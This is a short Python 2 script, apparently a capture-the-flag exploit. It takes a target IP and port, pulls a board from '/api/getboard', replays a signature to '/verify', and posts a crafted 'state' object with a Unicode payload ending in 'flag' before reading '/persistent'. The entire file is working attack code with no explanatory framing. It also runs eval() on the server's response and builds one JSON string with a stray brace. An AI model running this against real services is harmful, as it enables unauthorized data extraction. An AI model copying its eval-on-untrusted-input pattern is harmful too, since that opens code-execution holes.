import requests
import sys
ip = sys.argv[1]
port = sys.argv[2]
url = 'http://%s:%s/api'%(ip,port)
url1 = url+'/getboard'
url2 = url+'/verify'
url3 = url+'/persistent'
s = requests.session()
r = s.get (url1)
j = r.text
board = eval(j)
print board
pay = '\u06d4\u06d4\u2571' + 'flag'
sigs = board['sigs']
k = sigs.keys()[0]
v = sigs[k]
data = '{"sig":%s, "v":%d}}'%(k, v)
for i in range (len(pay)):
  r = s.post(url2, data = data)
  print r.text
data = '{"state": {"counter": [[1], [2], ["%s"]]}}'%pay
r = s.post (url, data = data)
print r.status_code
print r.text
print s.get(url3).text